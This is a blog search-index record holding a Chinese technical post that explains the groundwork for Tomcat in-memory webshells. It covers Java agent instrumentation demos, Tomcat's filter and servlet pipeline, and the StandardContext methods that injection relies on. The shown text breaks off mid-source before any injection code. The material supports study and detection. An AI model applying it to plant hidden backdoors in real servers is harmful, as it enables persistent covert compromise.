{"meta":{"title":"self_209'blog","subtitle":"","description":"","author":"self_209","url":"https://self209.github.io","root":"/"},"pages":[{"title":"all-categories","date":"2021-12-25T10:13:54.918Z","updated":"2021-12-25T10:13:54.918Z","comments":false,"path":"all-categories/index.html","permalink":"https://self209.github.io/all-categories/index.html","excerpt":"","text":""},{"title":"all-tags","date":"2021-12-25T10:15:46.692Z","updated":"2021-12-25T10:15:46.692Z","comments":false,"path":"all-tags/index.html","permalink":"https://self209.github.io/all-tags/index.html","excerpt":"","text":""},{"title":"all-archives","date":"2021-12-25T10:16:57.727Z","updated":"2021-12-25T10:16:57.727Z","comments":false,"path":"all-archives/index.html","permalink":"https://self209.github.io/all-archives/index.html","excerpt":"","text":""}],"posts":[{"title":"Tomcat内存马","slug":"20220115","date":"2022-01-15T12:39:17.000Z","updated":"2022-02-28T15:14:13.328Z","comments":false,"path":"2022/01/15/20220115/","link":"","permalink":"https://self209.github.io/2022/01/15/20220115/","excerpt":"本文从tomcat容器（Container）的请求处理流程来以及组件的注册流程来分析tomcat内存马的实现。","text":"本文从tomcat容器（Container）的请求处理流程来以及组件的注册流程来分析tomcat内存马的实现。 基础知识内存马类型目前业界的内存马主要分为两大类： Agent型 利用instrument机制，在不增加新类和新方法的情况下，对现有类的执行逻辑进行修改。JVM层注入，通用性强。 非Agent型 servlet规范型 动态注册符合servlet规范的自定义恶意组件到web容器中，攻击方通过请求自定义路由实现与内存马通信 servlet Filter Listener 基于java框架实现型 servlet规范型原理类似，也是动态注册。不同之处是针对java框架的特有属性。 tomcat Pipeline-Valve struts2 interceptor spring controller java agent基础知识参考：https://xz.aliyun.com/t/9450#toc-3 在JDK1.5以后，javaagent是一种能够在不影响正常编译的情况下，修改字节码。 Agent分为两种，一种是在主程序之前运行的Agent，一种是在主程序之后运行的Agent（前者的升级版，1.6以后提供） premain方法，主程序之前运行的Agent。 agentmain方法，主程序之后运行的Agent。 premain写一个premain实例 1、创建一个PremainAgent类 123456789import java.lang.instrument.Instrumentation;public class PremainAgent &#123; public static void premain(String args, Instrumentation inst) throws Exception&#123; for (int i = 0; i &lt; 3; i++) &#123; System.out.println(&quot;premain invoke!&quot;); &#125; &#125;&#125; 2、在resources包下创建META-INF/MANIFEST.MF文件，并写入如下内容(记得多敲一个回车) 12345Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: org.example.PremainAgent 3、打包成jar包PremainAgent.jar 4、编写HelloWorld主程序 1234567public class HelloWorld &#123; public static void main(String[] args) &#123; for (int i = 0; i &lt; 3; i++)&#123; System.out.println(&quot;Hello,World!&quot;); &#125; &#125;&#125; 5、打包成HelloWorld.jar包 这里注意一下设置main class 6、命令行运行java -javaagent:PremainAgent.jar -jar HelloWorld.jar VirtualMachine该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。 1234567891011121314public abstract class VirtualMachine &#123; // 获得当前所有的JVM列表 public static List&lt;VirtualMachineDescriptor&gt; list() &#123; ... &#125; // 根据pid连接到JVM public static VirtualMachine attach(String id) &#123; ... &#125; // 断开连接 public abstract void detach() &#123;&#125; // 加载agent public void loadAgent(String agent) &#123; ... &#125;&#125; InstrumentationInstrumentation 常用方法如下： void addTransformer(ClassFileTransformer transformer, boolean canRetransform); 增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。 void redefineClasses(ClassDefinition… definitions) hrows ClassNotFoundException, UnmodifiableClassException; 在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。 boolean removeTransformer(ClassFileTransformer transformer); 删除一个类转换器 void retransformClasses(Class&lt;?&gt;… classes) throws UnmodifiableClassException 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。 agentmainagentmain与premain不同在于，agentmain可以在程序执行时加载，下面就来实现一下程序执行时修改程序字节码 1、创建主程序（也就是被修改的类），无线循环打印Hello,Word!!! 1234567891011121314151617import java.util.concurrent.TimeUnit;public class Run &#123; public static void main(String[] args) throws InterruptedException &#123; Run run = new Run(); while (true)&#123; run.HelloWord(); TimeUnit.SECONDS.sleep(2); &#125; &#125; public void HelloWord()&#123; System.out.println(&quot;Hello,Word!!!&quot;); &#125;&#125; 2、创建一个AgentMain类以及TransformerDemo内部类，TransformerDemo内部类实现ClassFileTransformer接口 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.lang.instrument.Instrumentation;import java.lang.instrument.UnmodifiableClassException;import java.security.ProtectionDomain;public class AgentMain &#123; public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException &#123; System.out.println(&quot;agentmain invoke ! ! !&quot;); Class[] classes = inst.getAllLoadedClasses();//获取所有加载的class for (Class aClass : classes) &#123; if (aClass.getName().equals(TransformerDemo.editClassName)) &#123; inst.addTransformer(new TransformerDemo(), true);//添加 Transformer inst.retransformClasses(aClass);// 触发 Transformer &#125; &#125; &#125;&#125;class TransformerDemo implements ClassFileTransformer &#123; //需要修改的类 public static final String editClassName = &quot;org.example.Run&quot;; //修改的方法名 public static final String editMethod = &quot;HelloWord&quot;; @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123; try &#123; ClassPool cp = ClassPool.getDefault();//获取的 ClassPool 使用 JVM 的类搜索路径。 if (classBeingRedefined != null) &#123; ClassClassPath ccp = new ClassClassPath(classBeingRedefined); cp.insertClassPath(ccp); &#125; CtClass ctc = cp.get(editClassName);//获取需要修改的类的Class对象 CtMethod method = ctc.getDeclaredMethod(editMethod);//获取方法 String source = &quot;&#123;System.out.println(\\&quot;Hello transformer!!!\\&quot;);&#125;&quot;; method.setBody(source);//设置方法体 byte[] bytes = ctc.toBytecode(); ctc.detach(); return bytes; &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; 3、在resources包下创建META-INF/MANIFEST.MF文件，并写入如下内容 12345Manifest-Version: 1.0Can-Redefine-Classes: trueAgent-Class: org.example.AgentMainCan-Retransform-Classes: true 4、将AgentMain打包成jar包agentmain.jar 5、编写attachmain用于调用Attach API 实现启动后加载 123456789public static void main( String[] args ) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123; for (VirtualMachineDescriptor descriptor : VirtualMachine.list()) &#123; if (descriptor.displayName().equals(&quot;org.example.Run&quot;)) &#123;//判断类名是否为修改的类 VirtualMachine virtualMachine = VirtualMachine.attach(descriptor.id());//根据pid连接需要修改的类 virtualMachine.loadAgent(&quot;C:\\\\IdeaProjects\\\\tomcatdebug\\\\agentmain\\\\out\\\\artifacts\\\\agentmain_jar\\\\agentmain.jar&quot;);//加载agentmain.jar virtualMachine.detach(); &#125; &#125;&#125; 6、先启动主程序Run，开始打印Hello,Word!!! 7、启动attachmain加载agentmain.jar，实现修改Run.HelloWord方法字节码 Tomcat基础知识Listener JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。 生命周期 以ServletRequestListener为例，ServletRequestListener主要用于监听ServletRequest对象的创建和销毁,一个ServletRequest可以注册多个ServletRequestListener接口。 每次请求创建时调用requestInitialized()。 每次请求销毁时调用requestDestroyed()。 代码实现： 1234567891011121314public class ListenerDemo implements ServletRequestListener &#123; @Override public void requestInitialized(ServletRequestEvent sre) &#123; //每次请求创建时调用 System.out.println(&quot;请求创建&quot;); &#125; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; //每次请求销毁时调用 System.out.println(&quot;请求销毁&quot;); &#125;&#125; Filter filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。 生命周期 自定义Filter的实现，需要实现javax.servlet.Filter下的init()、doFilter()、destroy()三个方法。 启动服务器时加载过滤器的实例，并调用init()方法来初始化实例； 每一次请求时都只调用方法doFilter()进行处理； 停止服务器时调用destroy()方法，销毁实例。 代码实现： 12345678910111213141516public class FilterDemo implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; System.out.println(&quot;doFilter执行&quot;); filterChain.doFilter(servletRequest,servletResponse); &#125; @Override public void destroy() &#123; &#125;&#125; Servlet servlet是一种运行服务器端的java应用程序，具有独立于平台和协议的特性，并且可以动态的生成web页面，它工作在客户端请求与服务器响应的中间层。Servlet 的主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。 生命周期 Servlet 的生命周期开始于Web容器的启动时，它就会被载入到Web容器内存中，直到Web容器停止运行或者重新装入servlet时候结束。这里也就是说明，一旦Servlet被装入到Web容器之后，一般是会长久驻留在Web容器之中。 装入：启动服务器时加载Servlet的实例 初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成 调用：从第一次到以后的多次访问，都是只调用doGet()或doPost()方法 销毁：停止服务器时调用destroy()方法，销毁实例 代码实现： 12345678public class ServletDemo extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; System.out.println(&quot;Servlet执行....&quot;); &#125;&#125; web.xml对于这三种组件的加载顺序是：listener -&gt; filter -&gt; servlet，也就是说listener的优先级为三者中最高的。 Container 结构Tomcat设计了4种容器，分别是Engine、Host、Context和Wrapper。这4种容器是父子关系。 Tomcat通过一种分层的架构，使得Servlet容器具有很好的灵活性。 各个组件的含义 ： Engine: 表示整个Catalina的Servlet引擎，用来管理多个虚拟站点，一个Service最多只能有一个Engine，但是一个引擎可包含多个Host Host: 代表一个虚拟主机，或者说一个站点，可以给Tomcat配置多个虚拟主机地址，而一个虚拟主机下可包含多个Context Context: 表示一个Web应用程序， 一个Web应用可包含多个Wrapper Wrapper: 表示一个Servlet，Wrapper 作为容器中的最底层，不能包含子容器 Container请求处理流程Container处理请求是使用Pipeline-Valve管道来处理的！（Valve是阀门之意） Pipeline-Valve是责任链模式，责任链模式是指在一个请求处理的过程中有很多处理者依次对请求进行处理，每个处理者负责做自己相应的处理，处理完之后将处理后的请求返回，再让下一个处理着继续处理。 但是！Pipeline-Valve使用的责任链模式和普通的责任链模式有些不同！区别主要有以下两点： 每个Pipeline都有特定的Valve，而且是在管道的最后一个执行，这个Valve叫做BaseValve，BaseValve是不可删除的； 在上层容器的管道的BaseValve中会调用下层容器的管道。 我们知道Container包含四个子容器，而这四个子容器对应的BaseValve分别在：StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve。 Pipeline的处理流程图如下： Connector在接收到请求后会首先调用最顶层容器的Pipeline来处理，这里的最顶层容器的Pipeline就是EnginePipeline（Engine的管道）； 在Engine的管道中依次会执行EngineValve1、EngineValve2等等，最后会执行StandardEngineValve，在StandardEngineValve中会调用Host管道，然后再依次执行Host的HostValve1、HostValve2等，最后在执行StandardHostValve，然后再依次调用Context的管道和Wrapper的管道，最后执行到StandardWrapperValve。 当执行到StandardWrapperValve的时候，会在StandardWrapperValve中创建FilterChain，并调用其doFilter方法来处理请求，这个FilterChain包含着我们配置的与请求相匹配的Filter和Servlet，其doFilter方法会依次调用所有的Filter的doFilter方法和Servlet的service方法，这样请求就得到了处理！ 当所有的Pipeline-Valve都执行完之后，并且处理完了具体的请求，这个时候就可以将返回的结果交给Connector了，Connector在通过Socket的方式将结果返回给客户端。 Container请求处理流程源码分析这里只是对Container的处理流程分析，所以直接找到连接器（Connector）和容器（Container）相连的Adapter组件的实现类CoyoteAdapter，CoyoteAdapter负责将Tomcat Request转成ServletRequest，再调用容器的Service方法。 Service方法 直接看关键代码 1connector.getService().getContainer().getPipeline().getFirst().invoke(request, response); connector.getService() 获取的是当前 connector 关联的 Service 组件，默认情况下获得的就org.apache.catalina.core.StandardService的对象。 getContainer 方法获得的是org.apache.catalina.core.StandardEngine的对象，这里为什么能获取到StandardEngine对象涉及到了Java 解析 xml 文件，通过Digester 对象所包含的解析规则生成相应对象。这里不做深入研究。 紧接着的 getPipeline 方法返回的是 StandardEngine 类的父类org.apache.catalina.core.ContainerBase类的成员变量 pipeline 所以 connector.getService().getContainer().getPipeline() 方法返回的是org.apache.catalina.core.StandardPipeline类的对象 该对象就是前面提到的管道（ Pipeline ）。所有的管道类都会实现org.apache.catalina.Pipeline这个接口，看下这个接口中定义的方法： Tomat中一个管道包含多个阀（ Valve ），这些阀共分为两类，一类叫基础阀（通过 getBasic、setBasic 方法调用），一类是普通阀（通过 addValve、removeValve 调用）。管道都是包含在一个容器当中，所以 API 里还有 getContainer 和 setContainer 方法。一个管道一般有一个基础阀（通过 setBasic 添加），可以有 0 到多个普通阀（通过 addValve 添加）。 所有的阀类都会实现org.apache.catalina.Valve这个接口，看下这个接口中定义的方法： 重点关注 setNext、getNext、invoke 这三个方法，通过setNext设置该阀的下一阀，通过 getNext 返回该阀的下一个阀的引用，invoke 方法则执行该阀内部自定义的请求处理代码。 Tomcat里 Pipeline 的默认实现类是org.apache.catalina.core.StandardPipeline，其内部有三个成员变量：basic、first、container 。Pipeline 内部维护 first 和 basic 两个阀，其它相关阀通过 getNext 来获取。 继续看connector.getService().getContainer().getPipeline().getFirst()方法getFirst的实现： 如果管道中有普通阀则返回普通阀链条最开始的那个，否则就返回基础阀。 那么就来看看 StandardEngine 类的管道中的基础阀的代码实现。先看下该基础阀设置的代码，在org.apache.catalina.core.StandardEngine对象的构造函数中： 第 67行即设置基础阀。所以connector.getService().getContainer().getPipeline().getFirst().invoke(request, response) 类的 invoke 方法会执行到 org.apache.catalina.core.StandardEngineValve 类的 invoke 方法 从请求对象中取出该请求关联的 Hsost（默认情况下是org.apache.catalina.core.StandardHost对象），经过上述代码分析应该可以看出87行会先判断StandardPipeline对象的first属性是否为null，不为null，则返回first对象，所以这里应该是执行AbstractAccessLogValve的invoke方法。 通过 getNext 返回该阀的下一个阀的引用 获取到ErrorReportValve，调用ErrorReportValve的invoke方法 再通过 getNext 返回该阀的下一个阀的引用 这里返回StandardHostValve，就会调用StandardHostValve的invoke方法。 第137 行，会调用该请求相关的 Context 的管道内所有的阀的 invoke 方法，默认情况下 Context 是org.apache.catalina.core.StandardContext类的对象，其构造方法中设置了管道的基础阀 所以无论有多少个Valve最后都会调用StandardContextValve的invoke方法， 看下其基础阀的 invoke 方法代码： 123456789101112131415161718192021222324252627282930313233343536public final void invoke(Request request, Response response) throws IOException, ServletException &#123; // Disallow any direct access to resources under WEB-INF or META-INF MessageBytes requestPathMB = request.getRequestPathMB(); if ((requestPathMB.startsWithIgnoreCase(&quot;/META-INF/&quot;, 0)) || (requestPathMB.equalsIgnoreCase(&quot;/META-INF&quot;)) || (requestPathMB.startsWithIgnoreCase(&quot;/WEB-INF/&quot;, 0)) || (requestPathMB.equalsIgnoreCase(&quot;/WEB-INF&quot;))) &#123; response.sendError(HttpServletResponse.SC_NOT_FOUND); return; &#125; // Select the Wrapper to be used for this Request Wrapper wrapper = request.getWrapper(); if (wrapper == null || wrapper.isUnavailable()) &#123; response.sendError(HttpServletResponse.SC_NOT_FOUND); return; &#125; // Acknowledge the request try &#123; response.sendAcknowledgement(); &#125; catch (IOException ioe) &#123; container.getLogger().error(sm.getString( &quot;standardContextValve.acknowledgeException&quot;), ioe); request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, ioe); response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR); return; &#125; if (request.isAsyncSupported()) &#123; request.setAsyncSupported(wrapper.getPipeline().isAsyncSupported()); &#125; wrapper.getPipeline().getFirst().invoke(request, response);&#125; 最后一 行，从请求中取出关联的 wrapper 对象后调用其管道内所有阀的 invoke 方法最后调用基础阀StandardWrapperValve的invoke方法。wrapper 对象默认是org.apache.catalina.core.StandardWrapper类的实例，同样是在该类的构造方法中设置的基础阀： 我们来看StandardWrapperValve的invoke方法，代码很长我们直接看关键代码。 关键代码： 这儿调用Wrapper的allocate()方法分配一个Servlet实例，前面提到wrapper 对象默认是org.apache.catalina.core.StandardWrapper类的实例 123if (!unavailable) &#123; servlet = wrapper.allocate();&#125; allocate方法里真正加载并初始化servlet实例的是loadServlet方法 loadServlet方法通过实例管理器，创建Servlet实例 最后返回Servlet 回到StandardWrapperValve中继续往下执行，创建过滤器链 创建过滤器链，类似于Pipeline的功能 1ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); 创建过滤器链是调用的org.apache.catalina.core.ApplicationFilterFactory的createFilterChain()方法。 初始化一个空的 FilterChain。 设置Servlet 获取StandardContext对象，然后调用StandardContext对象的findFilterMaps方法。 findFilterMaps方法返回filterMaps属性，filterMaps属性是一个ContextFilterMaps对象，里面的array属性是FilterMap对象，FilterMap对象中存储着filter的web.xml的配置信息。FilterMap的filterName属性存储着&lt;filter-name&gt;标签的内容，urlPatterns属性存储着&lt;url-pattern&gt;标签的内容。 获取请求的URL路径和Servlet的名字。 调用FilterMap对象的getFilterName方法，获取ContextFilterMaps对象的FilterMap对象中的filterName属性 再调用StandardContext对象的findFilterConfig方法。filterConfigs是一个HashMap对象，里面存放着String和ApplicationFilterConfig类型的键值对对象。这里返回filterConfigs对象中key为FilterDemo的value对象，也就是ApplicationFilterConfig对象。 ApplicationFilterConfig对象存放着filterDef对象，filterDef对象中存放着filterClass和filterName的定义 继续往下执行，将filterConfig添加到filterChain的filters数组中 返回FilterChain 回到StandardWrapperValve的invoke方法。 调用过滤器链的doFilter，最终会调用到Servlet的service方法 1filterChain.doFilter(request.getRequest(),response.getResponse()); ApplicationFilterChain类的doFilter函数代码如下,它会将处理委托给internalDoFilter函数。 123456789101112131415161718192021222324252627282930313233@Overridepublic void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException &#123; if( Globals.IS_SECURITY_ENABLED ) &#123; final ServletRequest req = request; final ServletResponse res = response; try &#123; java.security.AccessController.doPrivileged( new java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123; @Override public Void run() throws ServletException, IOException &#123; internalDoFilter(req,res); return null; &#125; &#125; ); &#125; catch( PrivilegedActionException pe) &#123; Exception e = pe.getException(); if (e instanceof ServletException) throw (ServletException) e; else if (e instanceof IOException) throw (IOException) e; else if (e instanceof RuntimeException) throw (RuntimeException) e; else throw new ServletException(e.getMessage(), e); &#125; &#125; else &#123; internalDoFilter(request,response); &#125;&#125; ApplicationFilterChain类的internalDoFilter函数代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384// 1. internalDoFilter方法通过pos和n来调用过滤器链里面的每个过滤器。pos表示当前的过滤器下标，n表示总的过滤器数量// 2. internalDoFilter方法最终会调用servlet.service()方法private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException &#123; // Call the next filter if there is one // 1. 当pos小于n时, 则执行Filter if (pos &lt; n) &#123; // 2. 得到 过滤器 Filter，执行一次post++ ApplicationFilterConfig filterConfig = filters[pos++]; try &#123; Filter filter = filterConfig.getFilter(); if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase( filterConfig.getFilterDef().getAsyncSupported())) &#123; request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE); &#125; if( Globals.IS_SECURITY_ENABLED ) &#123; final ServletRequest req = request; final ServletResponse res = response; Principal principal = ((HttpServletRequest) req).getUserPrincipal(); Object[] args = new Object[]&#123;req, res, this&#125;; SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal); &#125; else &#123; // 4. 这里的 filter 的执行 有点递归的感觉, 通过 pos 来控制从 filterChain 里面拿出那个 filter 来进行操作 // 这里把this（filterChain）传到自定义filter里面，我们自定义的filter，会重写doFilter，在这里会被调用，doFilter里面会执行业务逻辑，如果执行业务逻辑成功，则会调用 filterChain.doFilter(servletRequest, servletResponse); ，filterChain就是这里传过去的this；如果业务逻辑执行失败，则return，filterChain终止，后面的servlet.service(request, response)也不会执行了 // 所以在 Filter 里面所调用 return, 则会终止 Filter 的调用, 而下面的 Servlet.service 更本就没有调用到 filter.doFilter(request, response, this); &#125; &#125; catch (IOException | ServletException | RuntimeException e) &#123; throw e; &#125; catch (Throwable e) &#123; e = ExceptionUtils.unwrapInvocationTargetException(e); ExceptionUtils.handleThrowable(e); throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e); &#125; return; &#125; // We fell off the end of the chain -- call the servlet instance try &#123; if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; lastServicedRequest.set(request); lastServicedResponse.set(response); &#125; if (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123; request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE); &#125; // Use potentially wrapped request from this point if ((request instanceof HttpServletRequest) &amp;&amp; (response instanceof HttpServletResponse) &amp;&amp; Globals.IS_SECURITY_ENABLED ) &#123; final ServletRequest req = request; final ServletResponse res = response; Principal principal = ((HttpServletRequest) req).getUserPrincipal(); Object[] args = new Object[]&#123;req, res&#125;; SecurityUtil.doAsPrivilege(&quot;service&quot;, servlet, classTypeUsedInService, args, principal); &#125; else &#123; //当pos等于n时，过滤器都执行完毕，终于执行了熟悉的servlet.service(request, response)方法。 servlet.service(request, response); &#125; &#125; catch (IOException | ServletException | RuntimeException e) &#123; throw e; &#125; catch (Throwable e) &#123; e = ExceptionUtils.unwrapInvocationTargetException(e); ExceptionUtils.handleThrowable(e); throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e); &#125; finally &#123; if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; lastServicedRequest.set(null); lastServicedResponse.set(null); &#125; &#125;&#125; pos和n是ApplicationFilterChain的成员变量，分别表示过滤器链的当前位置和过滤器总数，所以当pos小于n时，会不断执行ApplicationFilterChain的doFilter方法；当pos等于n时，过滤器都执行完毕，最后执行servlet.service(request, response)方法。 Servlet加载与初始化容器组件（ StandardEngine、StandardHost、StandardContext、StandardWrapper ）都会继承父类org.apache.catalina.core.ContainerBase，在这些容器组件启动时将会调用自己内部的 startInternal 方法，在该方法内部一般会调用父类的 startInternal 方法（ StandardContext 类的实现除外），StandardContext 类会调用自己的startInternal 方法，在StandardContext 类的startInternal 方法中，会调用loadOnStartup方法，加载并初始化所有“load on startup”servlet。 跟进findChildren children是一个子容器。 children是一个HashMap类型对象，存储着StandardWrapper对象，然后将HashMap类型对象转换为Container类型return，然后进入loadOnStartup方法。这个children就是我们注入Servlet内存马的关键，会在内存马的实现中用到。 loadOnStartup 1234567891011121314151617181920212223242526272829303132333435363738public class StandardContext extends ContainerBase implements Context, NotificationEmitter &#123; public boolean loadOnStartup(Container children[]) &#123; TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;(); for (Container child : children) &#123; Wrapper wrapper = (Wrapper) child; int loadOnStartup = wrapper.getLoadOnStartup();//获取loadOnStartup值 if (loadOnStartup &lt; 0) &#123; continue; &#125; Integer key = Integer.valueOf(loadOnStartup);//这里key的值就是loadOnStartup值 ArrayList&lt;Wrapper&gt; list = map.get(key);//获取map指定键映射到的值，这里前面并没有添加元素到map中，所以是null if (list == null) &#123; list = new ArrayList&lt;&gt;(); map.put(key, list);//将list添加到map中 &#125;&lt;&gt;() list.add(wrapper); //将wrapper添加到list中，这里的list是ArrayList&lt;&gt;() &#125; // Load the collected &quot;load on startup&quot; servlets for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123; for (Wrapper wrapper : list) &#123; try &#123; wrapper.load(); // 调用wrapper的load方法加载servlet &#125; catch (ServletException e) &#123; getLogger().error(sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;, getName(), wrapper.getName()), StandardWrapper.getRootCause(e)); if(getComputedFailCtxIfServletStartFails()) &#123; return false; &#125; &#125; &#125; &#125; return true; &#125; 加载并初始化 StandardContextStandardContext是Context的实现类，初始化各种Listener、Filter和Servlet，内存马都是基于修改StandardContext来实现的，下面介绍几个在注入内存马中会用到的方法及属性 filterConfigs属性 存放着filter配置以及实例，以filter名键入 123456/** * The set of filter configurations (and associated filter instances) we * have initialized, keyed by filter name. */private HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = new HashMap&lt;&gt;(); filterDefs filter定义集，以filter名键入，存储着filter的定义 12345/** * The set of filter definitions for this application, keyed by * filter name. */private HashMap&lt;String, FilterDef&gt; filterDefs = new HashMap&lt;&gt;(); filterMaps filter映射集，存储着filter的映射关系 1234567/** * The set of filter mappings for this application, in the order * they were defined in the deployment descriptor with additional mappings * added via the &#123;@link ServletContext&#125; possibly both before and after those * defined in the deployment descriptor. */private final ContextFilterMaps filterMaps = new ContextFilterMaps(); addApplicationEventListener 将侦听器添加到初始化的应用程序事件侦听器列表的末尾 123456789/** * Add a listener to the end of the list of initialized application event * listeners. * * @param listener The listener to add */public void addApplicationEventListener(Object listener) &#123; applicationEventListenersList.add(listener);&#125; addFilterDef 为Context添加一个Filter定义 1234567891011121314/** * Add a filter definition to this Context. * * @param filterDef The filter definition to be added */@Overridepublic void addFilterDef(FilterDef filterDef) &#123; synchronized (filterDefs) &#123; filterDefs.put(filterDef.getFilterName(), filterDef); &#125; fireContainerEvent(&quot;addFilterDef&quot;, filterDef);&#125; addFilterMap 在当前的Filter映射集的末尾添加一个Filter映射到这个Context 1234567891011121314151617/** * Add a filter mapping to this Context at the end of the current set * of filter mappings. * * @param filterMap The filter mapping to be added * * @exception IllegalArgumentException if the specified filter name * does not match an existing filter definition, or the filter mapping * is malformed */@Overridepublic void addFilterMap(FilterMap filterMap) &#123; validateFilterMap(filterMap); // Add this filter mapping to our registered set filterMaps.add(filterMap); fireContainerEvent(&quot;addFilterMap&quot;, filterMap);&#125; createWrapper 创建并返回一个新的Wrapper实例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * Factory method to create and return a new Wrapper instance, of * the Java implementation class appropriate for this Context * implementation. The constructor of the instantiated Wrapper * will have been called, but no properties will have been set. */ @Override public Wrapper createWrapper() &#123; Wrapper wrapper = null; if (wrapperClass != null) &#123; try &#123; wrapper = (Wrapper) wrapperClass.getConstructor().newInstance(); &#125; catch (Throwable t) &#123; ExceptionUtils.handleThrowable(t); log.error(&quot;createWrapper&quot;, t); return null; &#125; &#125; else &#123; wrapper = new StandardWrapper(); &#125; synchronized (wrapperLifecyclesLock) &#123; for (int i = 0; i &lt; wrapperLifecycles.length; i++) &#123; try &#123; Class&lt;?&gt; clazz = Class.forName(wrapperLifecycles[i]); LifecycleListener listener = (LifecycleListener) clazz.getConstructor().newInstance(); wrapper.addLifecycleListener(listener); &#125; catch (Throwable t) &#123; ExceptionUtils.handleThrowable(t); log.error(&quot;createWrapper&quot;, t); return null; &#125; &#125; &#125; synchronized (wrapperListenersLock) &#123; for (int i = 0; i &lt; wrapperListeners.length; i++) &#123; try &#123; Class&lt;?&gt; clazz = Class.forName(wrapperListeners[i]); ContainerListener listener = (ContainerListener) clazz.getConstructor().newInstance(); wrapper.addContainerListener(listener); &#125; catch (Throwable t) &#123; ExceptionUtils.handleThrowable(t); log.error(&quot;createWrapper&quot;, t); return null; &#125; &#125; &#125; return wrapper; &#125; addChild 添加子容器 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * Add a child Container, only if the proposed child is an implementation * of Wrapper. * * @param child Child container to be added * * @exception IllegalArgumentException if the proposed container is * not an implementation of Wrapper */ @Override public void addChild(Container child) &#123; // Global JspServlet Wrapper oldJspServlet = null; if (!(child instanceof Wrapper)) &#123; throw new IllegalArgumentException (sm.getString(&quot;standardContext.notWrapper&quot;)); &#125; boolean isJspServlet = &quot;jsp&quot;.equals(child.getName()); // Allow webapp to override JspServlet inherited from global web.xml. if (isJspServlet) &#123; oldJspServlet = (Wrapper) findChild(&quot;jsp&quot;); if (oldJspServlet != null) &#123; removeChild(oldJspServlet); &#125; &#125; super.addChild(child); if (isJspServlet &amp;&amp; oldJspServlet != null) &#123; /* * The webapp-specific JspServlet inherits all the mappings * specified in the global web.xml, and may add additional ones. */ String[] jspMappings = oldJspServlet.findMappings(); for (int i=0; jspMappings!=null &amp;&amp; i&lt;jspMappings.length; i++) &#123; addServletMappingDecoded(jspMappings[i], child.getName()); &#125; &#125; &#125; addServletMappingDecoded servletMappings是一个HashMap类型的变量，存储了servletPath和servletName的键值对关系，addServletMappingDecoded函数实现了将servletPath和servletName添加为一个映射的功能； 1234567891011121314151617181920212223242526public void addServletMappingDecoded(String pattern, String name, boolean jspWildCard) &#123; // Validate the proposed mapping if (findChild(name) == null) throw new IllegalArgumentException (sm.getString(&quot;standardContext.servletMap.name&quot;, name)); String adjustedPattern = adjustURLPattern(pattern); if (!validateURLPattern(adjustedPattern)) throw new IllegalArgumentException (sm.getString(&quot;standardContext.servletMap.pattern&quot;, adjustedPattern)); // Add this mapping to our registered set synchronized (servletMappingsLock) &#123; String name2 = servletMappings.get(adjustedPattern); if (name2 != null) &#123; // Don&#x27;t allow more than one servlet on the same pattern Wrapper wrapper = (Wrapper) findChild(name2); wrapper.removeMapping(adjustedPattern); &#125; servletMappings.put(adjustedPattern, name); &#125; Wrapper wrapper = (Wrapper) findChild(name); wrapper.addMapping(adjustedPattern); fireContainerEvent(&quot;addServletMapping&quot;, 